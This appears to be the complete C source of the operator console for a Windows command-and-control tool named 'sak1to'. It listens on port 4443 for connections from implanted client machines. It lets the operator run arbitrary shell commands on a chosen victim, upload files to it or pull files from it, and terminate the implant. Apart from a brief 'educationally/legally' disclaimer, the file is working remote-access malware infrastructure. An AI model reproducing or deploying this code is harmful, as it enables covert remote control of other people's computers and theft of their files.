/*
Coded by d4rkstat1c.
Use this code educationally/legally.
*/
#include <WS2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "sakito_tools.h"

#define PORT 4443

#pragma comment(lib, "ws2_32.lib")

// Function to close specified socket.
void terminate_server(SOCKET socket, const char* const error) {
	int err_code = 0;
	if (error) {
		fprintf(stderr, "%s: ld\n", error, WSAGetLastError());
		err_code = 1;
	}

	closesocket(socket);
	WSACleanup();
	exit(err_code);
}

// Function to create socket.
const SOCKET create_socket() {
	// Initialize winsock.
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &wsData);

	// Create the server socket object.
	const SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == INVALID_SOCKET) {
		fprintf(stderr, "Socket creation failed: %ld\n", WSAGetLastError());
		WSACleanup();
		exit(1);
	}

	int optval = 1;
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) != 0)
		terminate_server(listen_socket, "Error setting socket options");

	return listen_socket;
}

// Function to bind socket to specified port.
void bind_socket(const SOCKET listen_socket) {
	// Create hint structure.
	struct sockaddr_in hint;

	// Assign member values.
	hint.sin_family = AF_INET;
	hint.sin_port = htons(PORT);
	hint.sin_addr.S_un.S_addr = INADDR_ANY;

	// Bind ip address and port to listen_socket.
	if (bind(listen_socket, (struct sockaddr*)&hint, sizeof(hint)) != 0)
		terminate_server(listen_socket, "Socket bind failed with error");

	// Place the listen_socket in listen state.
	if (listen(listen_socket, SOMAXCONN) != 0)
		terminate_server(listen_socket, "An error occured while placing the socket in listening state");
}

// Thread to recursively accept connections.
DWORD WINAPI accept_conns(LPVOID* lp_param) {
	// Assign member values to connection map object/structure.
	Conn_map* conns = (Conn_map*)lp_param;
	conns->alloc = MEM_CHUNK;
	conns->size = 0;
	conns->clients = malloc(conns->alloc * sizeof(Conn));
	conns->listen_socket = create_socket();

	// Bind socket to port.
	bind_socket(conns->listen_socket);

	while (1) {
		struct sockaddr_in client;
		int c_size = sizeof(client);

		// Client socket object.
		const SOCKET client_socket = accept(conns->listen_socket, (struct sockaddr*)&client, &c_size);
		if (client_socket == INVALID_SOCKET)
			terminate_server(conns->listen_socket, "Error accepting client connection");

		// Client's remote name and port.
		char host[NI_MAXHOST] = { 0 };
		char service[NI_MAXHOST] = { 0 };

		if (conns->size == conns->alloc)
			conns->clients = realloc(conns->clients, (conns->alloc += MEM_CHUNK) * sizeof(Conn));

		if (getnameinfo((struct sockaddr*)&client, sizeof(client), host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) {
			printf("%s connected on port %s\n", host, service);
		}
		else {
			inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
		}

		// If delete_conn() is executing: wait for it to finish modifying conns->clients to prevent race conditions from occurring.
		WaitForSingleObject(conns->ghMutex, INFINITE);

		// Add hostname string and client_socket object to Conn structure.
		conns->clients[conns->size].host = host;
		conns->clients[conns->size].sock = client_socket;
		conns->size++;

		// Release our mutex now.
		ReleaseMutex(conns->ghMutex);
	}
	return -1;
}

// Function to upload file to target machine (TCP file transfer).
int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// '3' is the command code for uploading a file via the client.
	buf[7] = '3';

	// Send command code + filename to be parsed.
	if (send(client_socket, &buf[7], cmd_len, 0) < 1)
		return SOCKET_ERROR;

	// Open file.
	FILE* fd = fopen(&buf[8], "rb");
	uint32_t bytes = 0, f_size = 0;

	// If the file exists:
	if (fd) {
		// Get file size and serialize f_size.
		fseek(fd, 0L, SEEK_END);
		f_size = ftell(fd);
		bytes = htonl(f_size);
		fseek(fd, 0L, SEEK_SET);
	}

	if (send(client_socket, (char*)&bytes, sizeof(bytes), 0) < 1)
		return SOCKET_ERROR;

	// Initialize i_result to true.
	int i_result = 1;

	if (f_size) {
		// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
		int bytes_read;
		while (!feof(fd) && i_result > 0) {
			if (bytes_read = fread(buf, 1, BUFLEN, fd))
				// Send file's bytes chunk to remote server.
				i_result = send(client_socket, buf, bytes_read, 0);
			else
				break;
		}
		// Close the file.
		fclose(fd);
	}

	return i_result;
}

// Function to receive file from target machine (TCP file transfer).
int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// '4' is the command code for downloading a file via the client.
	buf[9] = '4';

	// Send command code + filename to be parsed.
	if (send(client_socket, &buf[9], cmd_len, 0) < 1)
		return SOCKET_ERROR;

	FILE* fd = fopen(&buf[10], "wb");

	// Receive file size serialized uint32_t bytes.
	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
		return SOCKET_ERROR;

	// Deserialize file size bytes.
	uint32_t f_size = ntohl_conv(&*(buf));
	
	// Initialize i_result to true.
	int i_result = 1;

	// Varaible to keep track of downloaded data bytes.
	long int total = 0;

	// Receive all file bytes/chunks and write to file until total == file size.
	while (total != f_size && i_result > 0) {
		i_result = recv(client_socket, buf, BUFLEN, 0);
		fwrite(buf, 1, i_result, fd);
		total += i_result;
	}

	// Close the file.
	fclose(fd);

	return i_result;
}

// Function send change directory command to client.
int client_cd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// '1' is the command code for changing directory via the client.
	buf[3] = '1';
	
	// Send command code + directory to be parsed.
	if (send(client_socket, &buf[3], cmd_len, 0) < 1)
		return SOCKET_ERROR;

	return 1;
}

// Function to terminate/kill client.
int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// '2' is the command code for terminating/killing the process on the client.
	send(client_socket, "2", cmd_len, 0);

	return 0;
}


// Function to send command to client.
int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
	// Send command to server.
	if (send(client_socket, buf, cmd_len, 0) < 1)
		return SOCKET_ERROR;

	// Receive output stream size serialized uint32_t bytes.
	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
		return SOCKET_ERROR;

	// Deserialize stream size bytes.
	uint32_t s_size = ntohl_conv(&*(buf));

	// Initialize i_result to true.
	int i_result = 1;

	// Receive command output stream and write output chunks to stdout.
	do {
		if ((i_result = recv(client_socket, buf, BUFLEN, 0)) < 1)
			return i_result;
		fwrite(buf, 1, i_result, stdout);
	} while ((s_size -= i_result) > 0);

	// Write single newline character to stdout for cmd line alignment.
	fputc('\n', stdout);

	return i_result;
}

// Function to return function pointer based on parsed command.
const func parse_cmd(char* const buf) {
	// Array of command strings to parse stdin with.
	const char commands[4][10] = { "cd ", "exit", "upload ", "download " };

	// Function pointer array of each c2 command.
	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };

	for (int i = 0; i < 4; i++)
		if (compare(buf, commands[i]))
			return func_array[i];

	// If no command was parsed: send/execute the command string on the client via _popen().
	return &send_cmd;
}

// Function to resize conns array/remove and close connection.
void delete_conn(Conn_map* conns, const int client_id) {
	// If accept_conns() is executing: wait for it to finish modifying conns->clients to prevent race conditions from occurring.
	WaitForSingleObject(conns->ghMutex, INFINITE);

	if (conns->clients[client_id].sock)
		closesocket(conns->clients[client_id].sock);

	// If there's more than one connection: resize the clients structure member values.
	if (conns->size > 1) {
		int max_index = conns->size-1;
		for (size_t i = client_id; i < max_index; i++) {
			conns->clients[i].sock = conns->clients[i + 1].sock;
			conns->clients[i].host = conns->clients[i + 1].host;
		}
		conns->clients[max_index].sock = 0;
		conns->clients[max_index].host = NULL;
	}

	conns->size--;

	// Release our mutex now - so accept_conns() can continue execution.
	ReleaseMutex(conns->ghMutex);
}

// Function to parse interactive input and send to specified client.
void interact(Conn_map* conns, char* const buf, const int client_id) {
	const SOCKET client_socket = conns->clients[client_id].sock;
	char* client_host = conns->clients[client_id].host;

	// Initialize i_result to true.
	int i_result = 1;

	// Receive and parse input/send commands to client.
	while (i_result > 0) {
		printf("%s // ", client_host);
	
		// Set all bytes in buffer to zero.
		memset(buf, '\0', BUFLEN);

		buf[0] = '0';
		size_t cmd_len = get_line(&buf[1]) + 1;
		char* cmd = &buf[1];

		if (cmd_len > 1) {
			if (compare(cmd, "background")) {
				return;
			}
			else {
				// If a command is parsed call its corresponding function else execute-
				// the command on the client.
				const func target_func = parse_cmd(cmd);
				i_result = target_func(buf, cmd_len, client_socket);
			}
		}
	}

	// If client disconnected/exit command is parsed: delete the connection.
	delete_conn(conns, client_id);
	printf("Client: \"%s\" is no longer connected.\n\n", client_host);
}

// Function to execute command.
void exec_cmd(char* const buf) {
	// Call Popen to execute command(s) and read the processes' output.
	FILE* fpipe = _popen(buf, "r");
	fseek(fpipe, 0, SEEK_END);
	size_t cmd_len = ftell(fpipe);
	fseek(fpipe, 0, SEEK_SET);

	// Stream/write command output to stdout.
	int rb = 0;
	do {
		rb = fread(buf, 1, BUFLEN, fpipe);
		fwrite(buf, 1, rb, stdout);
	} while (rb == BUFLEN);

	// Write single newline character to stdout for cmd line alignment.
	fputc('\n', stdout);

	// Close the pipe.
	_pclose(fpipe);
}

// Main function for parsing console input and calling sakito-console functions.
int main(void) {
	Conn_map conns;

	conns.ghMutex = CreateMutex(NULL, FALSE, NULL);
	HANDLE acp_thread = CreateThread(0, 0, accept_conns, &conns, 0, 0);
	HANDLE  hColor;
	hColor = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hColor, 9);

	while (1) {
		printf("sak1to-console // ");
	
		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
		char buf[BUFLEN + 1] = { 0 };
		size_t cmd_len = get_line(buf);

		if (cmd_len > 1) {
			if (compare(buf, "exit")) {
				// Quit accepting connections.
				TerminateThread(acp_thread, 0);
				// if there's any connections close them before exiting.
				if (conns.size) {
					for (size_t i = 0; i < conns.size; i++)
						closesocket(conns.clients[i].sock);
					// Free allocated memory.
					free(conns.clients);
				}
				terminate_server(conns.listen_socket, NULL);
			}
			else if (compare(buf, "cd ")) {
				// List all connections.
				_chdir(&buf[3]);
			}
			else if (compare(buf, "list")) {
				// List all connections.
				list_connections(&conns);
			}
			else if (compare(buf, "interact ")) {
				// Interact with client.
				int client_id;
				client_id = atoi(&buf[9]);
				if (!conns.size || client_id < 0 || client_id > conns.size - 1)
					printf("Invalid client identifier.\n");
				else
					interact(&conns, buf, client_id);
			}
			else {
				// Execute command on host system.
				exec_cmd(buf);
			}
		}
	}
	return -1;
}
